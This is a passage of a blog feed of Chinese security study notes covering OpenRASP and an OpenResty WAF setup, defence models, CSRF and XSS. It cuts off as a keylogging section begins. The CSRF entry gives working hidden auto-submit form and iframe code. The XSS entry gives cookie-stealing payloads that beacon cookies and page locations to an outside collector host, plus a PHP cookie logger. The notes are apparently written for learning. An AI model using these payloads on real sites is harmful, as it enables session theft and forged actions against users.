class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://sourceforge.net/projects/wavsep/</span><br><span class="line">进入tomcat的manager.html页面进行deploy</span><br><span class="line"></span><br><span class="line">(因为需要数据库，这里需要安装mysql。)</span><br><span class="line"></span><br><span class="line">然后打开</span><br><span class="line">http://192.168.31.39:8080/wavsep/wavsep-install/install.jsp </span><br><span class="line"></span><br><span class="line">安装结束</span><br></pre></td></tr></table></figure><ol start="3"><li>安装openRASP</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar RaspInstall.jar -install &lt;tomcat_root&gt;</span><br></pre></td></tr></table></figure><ol start="4"><li>restart tomcat</li></ol><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><blockquote><p>进行了漏洞测试，发现规则支持还不够强大，需要自己写一些规则，定制性高。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;RASP, 一种已探针的形式，将保护引擎注入到应用服务中，可在文件，数据库，网络等多个方面，对应用进行保护，当发生敏感
      
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/categories/security/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>3-搭建WAF环境</title>
    <link href="http://yoursite.com/2018/06/18/3-%E6%90%AD%E5%BB%BAWAF%E7%8E%AF%E5%A2%83/"/>
    <id>http://yoursite.com/2018/06/18/3-搭建WAF环境/</id>
    <published>2018-06-18T12:19:26.000Z</published>
    <updated>2018-06-18T12:21:36.224Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>针对HTTP/HTTPS的安全策略为web应用提供保护的产品，承担了sql注入，xss，远程命令执行，目录遍历等攻击的抵抗，是守护安全的第一道防线</p></blockquote><h2 id="优点"><a class="markdownIt-Anchor" href="#优点"></a> 优点</h2><ol><li>使用，配置简单方便</li><li>能够抵抗常见的扫描和常见的漏洞测探</li></ol><h2 id="缺点"><a class="markdownIt-Anchor" href="#缺点"></a> 缺点</h2><ol><li>防护能力不足以对抗黑产，依赖规则，针对未知攻击无应对方法，容易绕过</li><li>无法承担基础业务安全能力，比如褥羊毛行为，刷短信接口等</li><li>审计能力不足，出现事故无法提取较为详细的事件log记录等等</li></ol><h1 id="配置一个简单的waf"><a class="markdownIt-Anchor" href="#配置一个简单的waf"></a> 配置一个简单的WAF</h1><h2 id="openresty"><a class="markdownIt-Anchor" href="#openresty"></a> OpenResty</h2><blockquote><p>基于nginx与lua的高性能web平台，内部集成了大量精良的nginx模块，用于方便的搭建超高并发和拓展性极高的web应用，web服务和动态网管</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line"></span><br><span class="line">Debian 和 Ubuntu 用户</span><br><span class="line">推荐您使用 apt-get安装以下的开发库:</span><br><span class="line"></span><br><span class="line">apt-get install libpcre3-dev \</span><br><span class="line">    libssl-dev perl make build-essential curl</span><br><span class="line">Fedora 和 RedHat 用户</span><br><span class="line">推荐您使用yum安装以下的开发库:</span><br><span class="line"></span><br><span class="line">yum install pcre-devel openssl-devel gcc curl</span><br><span class="line"></span><br><span class="line">./configure</span><br><span class="line">然后在进入 openresty-VERSION/ 目录, 然后输入以下命令配置:</span><br><span class="line"></span><br><span class="line">./configure</span><br><span class="line">默认, --prefix=/usr/local/openresty 程序会被安装到/usr/local/openresty目录。</span><br><span class="line"></span><br><span class="line">您可以指定各种选项，比如</span><br><span class="line"></span><br><span class="line">./configure --prefix=/opt/openresty \</span><br><span class="line">            --with-luajit \</span><br><span class="line">            --without-http_redis2_module \</span><br><span class="line">            --with-http_iconv_module \</span><br><span class="line">            --with-http_postgres_module</span><br><span class="line">            </span><br><span class="line">make</span><br><span class="line">或者make -j2 （双核编译）</span><br><span class="line"></span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="waf"><a class="markdownIt-Anchor" href="#waf"></a> waf</h2><p><a href="https://github.com/unixhot/waf.git" target="_blank" rel="noopener">https://github.com/unixhot/waf.git</a></p><h2 id="配置反向代理"><a class="markdownIt-Anchor" href="#配置反向代理"></a> 配置反向代理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># openresty</span><br><span class="line">http&#123;</span><br><span class="line">    ...</span><br><span class="line">    lua_shared_dict limit 50m;</span><br><span class="line">    lua_package_path &quot;/usr/local/openresty/nginx/conf/waf/?.lua&quot;;</span><br><span class="line">    init_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/init.lua&quot;;</span><br><span class="line">    access_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/access.lua&quot;;</span><br><span class="line">&#125;</span><br><span class="line">include &quot;/usr/local/openresty/nginx/conf/www.testwaf.com.conf&quot;;</span><br><span class="line"></span><br><span class="line">./nginx -s reload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># www.testwaf.com.conf</span><br><span class="line">upstream testwaf&#123;</span><br><span class="line">    server 192.168.1.12:80;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    server_name www.testwaf.com;</span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass: http://testwaf;</span><br><span class="line">        index index.html index.htm;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 最好使用root权限安装</span><br></pre></td></tr></table></figure><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><blockquote><p>重点还是学习waf是怎么写的，后面在仔细研究下源码。</p></blockquote><h1 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h1><p><a href="https://openresty.org/cn/" target="_blank" rel="noopener">https://openresty.org/cn/</a></p><p><a href="https://openresty.org/cn/installation.html" target="_blank" rel="noopener">https://openresty.org/cn/installation.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;针对HTTP/HTTPS的安全策略为web应用提供保护的产品，承担了sql注入，xss，远程命令执行，目录遍历等攻击的
      
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/categories/security/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>2-常见防御体系</title>
    <link href="http://yoursite.com/2018/06/18/2-%E5%B8%B8%E8%A7%81%E9%98%B2%E5%BE%A1%E4%BD%93%E7%B3%BB/"/>
    <id>http://yoursite.com/2018/06/18/2-常见防御体系/</id>
    <published>2018-06-18T12:19:01.000Z</published>
    <updated>2018-06-18T12:21:22.334Z</updated>
    
    <content type="html"><![CDATA[<h1 id="名词解释"><a class="markdownIt-Anchor" href="#名词解释"></a> 名词解释</h1><h3 id="ids"><a class="markdownIt-Anchor" href="#ids"></a> IDS：</h3><blockquote><p>IDS是英文“Intrusion Detection Systems”的缩写，中文意思是“入侵检测系统”。<br>专业上讲就是依照一定的安全策略，通过软、硬件，对网络、系统的运行状况进行监视，<br>尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性。<br>做一个形象的比喻：<br>假如防火墙是一幢大楼的门锁，那么IDS就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。</p></blockquote><h3 id="ips"><a class="markdownIt-Anchor" href="#ips"></a> IPS</h3><blockquote><p>入侵防御系统(IPS: Intrusion Prevention System)是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙(Packet Filter, Application Gateway)的补充。 入侵防御系统(Intrusion-prevention system)是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。</p></blockquote><h3 id="utm"><a class="markdownIt-Anchor" href="#utm"></a> UTM</h3><blockquote><p>UTM是对传统防护手段的整合和升华，是建立在原有安全网关设备基础之上的，拥有防火墙、入侵防御(IPS)、防病毒(AV)、VPN、内容过滤、反垃圾邮件等多种功能，这些技术处理方式仍然是UTM的基础，但这些处理方式不再各自为战，需要在统一的安全策略下相互配合，协同工作。<br>对于众多的功能，有必备功能和增值功能之分。一般而言，防火墙、VPN、入侵防御、防病毒是必备的功能模块，缺少任何一个不能称之为UTM。其余是增值功能，用户可以根据自身需求进行选择。</p></blockquote><h3 id="web威胁感知"><a class="markdownIt-Anchor" href="#web威胁感知"></a> web威胁感知</h3><blockquote><p>识别Web应用攻击，能够深度挖掘黑客针对Web的拖库、远程命令执行、敏感文件泄露、Webshell后门等攻击事件并发出准确的报警</p></blockquote><h1 id="常见的防御体系"><a class="markdownIt-Anchor" href="#常见的防御体系"></a> 常见的防御体系</h1><h2 id="边界防护"><a class="markdownIt-Anchor" href="#边界防护"></a> 边界防护</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;在网络边界解决问题，强调御敌于国门之外&quot;</span><br><span class="line"></span><br><span class="line">主要措施：</span><br><span class="line">a. WAF</span><br><span class="line">b. 内外网隔离</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">优点：</span><br><span class="line">部署简单</span><br><span class="line"></span><br><span class="line">缺点：</span><br><span class="line">内网突破后，黑客就控制了一切。</span><br></pre></td></tr></table></figure><h2 id="纵深防御体系"><a class="markdownIt-Anchor" href="#纵深防御体系"></a> 纵深防御体系</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&quot;纵深防御本质为多层防御，增加攻击成本。&quot;</span><br><span class="line"></span><br><span class="line">纵深防御分为四部分：</span><br><span class="line">a. 网络边界：WAF，防火墙，IPS，UTM，流量清洗设备等等</span><br><span class="line">b. 网络层：IDS，web威胁感知，web审计</span><br><span class="line">c. 服务器端：主机IDS，服务器杀毒，内核假哭，主机WAF等</span><br><span class="line">d. 数据库：数据库审计，数据库防火墙等</span><br><span class="line"></span><br><span class="line">优点：</span><br><span class="line">防护的定位清晰，攻击成本提高，安全性提高</span><br><span class="line"></span><br><span class="line">缺点：</span><br><span class="line">各个部分缺乏协同性，检测手段多基于黑名单和规则，对于专业的黑客而言，也是可以突破的。</span><br></pre></td></tr></table></figure><h2 id="河防体系"><a class="markdownIt-Anchor" href="#河防体系"></a> 河防体系</h2><blockquote><p>在隔离的基础上，严格控制办公网络对生产网络的访问，同时在生产网络的内部进行隔离的基础上，进行边界防护和检测。适用于数据中心用户</p></blockquote><h2 id="塔防体系"><a class="markdownIt-Anchor" href="#塔防体系"></a> 塔防体系</h2><blockquote><p>纵深防御的一种，加上了云的管控能力和威胁情报数据。</p></blockquote><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://anquan.baidu.com/pages/threat.html" target="_blank" rel="noopener">https://anquan.baidu.com/pages/threat.html</a></p><p><a href="https://searchsecurity.techtarget.com.cn/11-17666/" target="_blank" rel="noopener">https://searchsecurity.techtarget.com.cn/11-17666/</a></p><p><a href="https://baike.baidu.com/item/IPS/2131631" target="_blank" rel="noopener">https://baike.baidu.com/item/IPS/2131631</a></p><p><a href="https://zh.wikipedia.org/wiki/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/入侵检测系统</a></p><p><a href="https://baike.baidu.com/item/IDS/22042" target="_blank" rel="noopener">https://baike.baidu.com/item/IDS/22042</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;名词解释&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#名词解释&quot;&gt;&lt;/a&gt; 名词解释&lt;/h1&gt;
&lt;h3 id=&quot;ids&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ids&quot;&gt;&lt;/a&gt; IDS：&lt;/h3&gt;

      
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/categories/security/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>1-企业安全建设入门</title>
    <link href="http://yoursite.com/2018/06/18/1-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE%E5%85%A5%E9%97%A8/"/>
    <id>http://yoursite.com/2018/06/18/1-企业安全建设入门/</id>
    <published>2018-06-18T12:18:46.000Z</published>
    <updated>2018-06-18T12:21:09.606Z</updated>
    
    <content type="html"><![CDATA[<h1 id="两个概念"><a class="markdownIt-Anchor" href="#两个概念"></a> 两个概念</h1><p>PDR：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">protection（保护）：</span><br><span class="line">加密，认证，访问控制，防火墙，杀毒软件等等</span><br><span class="line"></span><br><span class="line">detection（检测）：</span><br><span class="line">入侵检测，漏洞扫描等</span><br><span class="line"></span><br><span class="line">response（应急响应）：</span><br><span class="line">建立应急响应机制，形成对安全的及时响应能力等</span><br></pre></td></tr></table></figure><p>P2DR</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">protection</span><br><span class="line">Detection</span><br><span class="line">Response</span><br><span class="line">Police</span><br><span class="line"></span><br><span class="line">建立在PDR的基础上，多了一个Police（根据风险分析产生的安全策略），其中Police是模型的核心。</span><br><span class="line"></span><br><span class="line">着重于描述：</span><br><span class="line">系统中哪些资源需要保护？</span><br><span class="line">如何实现对它们的保护？</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;两个概念&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#两个概念&quot;&gt;&lt;/a&gt; 两个概念&lt;/h1&gt;
&lt;p&gt;PDR：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/categories/security/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="企业安全建设" scheme="http://yoursite.com/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
  </entry>
  
  <entry>
    <title>CSRF攻击学习</title>
    <link href="http://yoursite.com/2018/06/14/CSRF%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2018/06/14/CSRF攻击学习/</id>
    <published>2018-06-14T15:26:27.000Z</published>
    <updated>2018-06-18T12:18:00.625Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>一图胜千言<br><img src="/images/csrf.jpg" alt="图片"></p></blockquote><h1 id="攻击方式"><a class="markdownIt-Anchor" href="#攻击方式"></a> 攻击方式</h1><ol><li>GET方式</li></ol><blockquote><p>假如现在有一个链接： <a href="https://csrf.com/m?addUser=id12345" target="_blank" rel="noopener">https://csrf.com/m?addUser=id12345</a> 那么我们就可以构造一个图片</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&apos;https://csrf.com/m?addUser=id12345&apos;&gt;</span><br></pre></td></tr></table></figure><p>只要你访问我的网站，那么就会触发这个链接，从而关注了我</p><ol start="2"><li>POST方式</li></ol><blockquote><p>POST的请求经常伴随着跳转，一跳转，就会暴露，这个时候我们就要考虑加一个iframe。<br>但是在csrf测试的页面加iframe，根据同源政策，显示不来内容。于是我们新建另一个页面，加上iframe，连接到csrf的测试页面。如下：<br>新建一个iframe</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;&lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;iframe style=&quot;display:block&quot; src=&apos;test.html&apos;&gt;&lt;/iframe&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在建一个test.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE HTML&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en-US"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF GET<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">form</span>  <span class="attr">name</span>=<span class="string">"form1"</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:5000/csrf"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'username'</span> <span class="attr">value</span>=<span class="string">"csrf_ee1"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"qwe1231"</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">          <span class="built_in">document</span>.forms.form1.submit();</span></span><br><span class="line"><span class="undefined">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这样一来，成功复现了csrf</p><h1 id="什么叫做xsrf"><a class="markdownIt-Anchor" href="#什么叫做xsrf"></a> 什么叫做XSRF？</h1><blockquote><p>XSRF指的是xss+csrf的攻击，指的是一个网站既有xss又有csrf。 这样一来就可以进行两者的结合，通过xss注入csrf的html代码。</p></blockquote><p>通过js生成代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">    iframe.style.display = <span class="string">'none'</span>;</span><br><span class="line">    iframe.src=<span class="string">'test.html'</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>csrf总的来说，主要聚焦于写，并不会窃取用户的数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;一图胜千言&lt;br&gt;
&lt;img src=&quot;/images/csrf.jpg&quot; alt=&quot;图片&quot;&gt;&lt;/p&gt;
&lt;/block
      
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
      <category term="CSRF" scheme="http://yoursite.com/categories/security/CSRF/"/>
    
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="CSRF" scheme="http://yoursite.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>xss攻击学习</title>
    <link href="http://yoursite.com/2018/06/14/xss%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2018/06/14/xss攻击学习/</id>
    <published>2018-06-14T15:12:45.000Z</published>
    <updated>2018-06-14T15:27:06.713Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h1><blockquote><p>xss 全称为 cross site scripting. 特指攻击者利用网站对于用户输入过滤不足的缺陷，输入可以对用户造成影响的html/js代码，从而窃取用户信息，进行病毒侵害等行为。</p></blockquote><h2 id="类型"><a class="markdownIt-Anchor" href="#类型"></a> 类型</h2><h3 id="反射型"><a class="markdownIt-Anchor" href="#反射型"></a> 反射型</h3><blockquote><p>将用户输入的数据通过url的形式直接或未经完善过滤就在浏览器中输出，导致浏览器执行了用户输入的代码数据</p></blockquote><h3 id="存储型"><a class="markdownIt-Anchor" href="#存储型"></a> 存储型</h3><blockquote><p>程序将用户输入的数据信息保存在了服务器端（如数据库），网页在查询数据时候，从中获取了畸形数据内容，在网页进行展示。造成xss</p></blockquote><h3 id="dom型"><a class="markdownIt-Anchor" href="#dom型"></a> DOM型</h3><blockquote><p>反射型xss的一种，不同点在于，注入的方式是根据js的DOM进行分析并注入,较为少见。</p></blockquote><h1 id="攻击"><a class="markdownIt-Anchor" href="#攻击"></a> 攻击</h1><h2 id="盗取cookies"><a class="markdownIt-Anchor" href="#盗取cookies"></a> 盗取cookies</h2><ol><li>简单的：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#js</span><br><span class="line">Document.location=&apos;https://www.xsser.me/cookies.php?cookie=&apos;+document.cookie;</span><br><span class="line"></span><br><span class="line">#php</span><br><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&apos;cookie&apos;];</span><br><span class="line">$log = fopen(&quot;cookies.txt&quot;,&quot;a&quot;);</span><br><span class="line">Fwrite($log,$cookie.&quot;&quot;\n&quot;)</span><br><span class="line">Fclose($log)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li>复杂的：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(function() &#123;</span><br><span class="line">    (new Image()).src = &apos;http://xsser.me/index.php?do=api&amp;id=RAMWD1&amp;location=&apos; + escape((function() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return document.location.href</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)()) + &apos;&amp;toplocation=&apos; + escape((function() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return top.location.href</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)()) + &apos;&amp;cookie=&apos; + escape((function() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return document.cookie</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)()) + &apos;&amp;opener=&apos; + escape((function() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            return (window.opener &amp;&amp; window.opener.location.href) ? window.opener.location.href : &apos;&apos;</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            return &apos;&apos;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)());</span><br><span class="line">&#125;)();</span><br><span class="line">if (&apos;&apos; == 1) &#123;</span><br><span class="line">    keep = new Image();</span><br><span class="line">    keep.src = &apos;http://xsser.me/index.php?do=keepsession&amp;id=RAMWD1&amp;url=&apos; + escape(document.location) + &apos;&amp;cookie=&apos; + escape(document.cookie)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="读取用户键盘输入"><a class="markdownIt-Anchor" href="#读取用户键盘输入"></a> 读取用户键盘输入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 